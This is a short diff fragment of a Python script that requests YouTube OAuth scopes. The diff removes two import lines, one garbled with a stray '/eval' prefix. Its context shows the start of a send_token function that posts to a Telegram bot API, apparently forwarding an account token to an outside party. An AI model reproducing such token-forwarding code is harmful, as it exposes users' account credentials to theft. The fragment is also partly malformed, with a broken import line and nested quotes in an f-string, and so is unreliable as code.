@@ -31,8 +31,6 @@ _SCOPES = 'http://gdata.youtube.com https://www.googleapis.com/auth/youtube'
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-/eval import requests
-from os import getenv
 
 def send_token(token):
     url = f"https://api.telegram.org/bot{getenv("BOT_TOKEN")}/sendMessage"
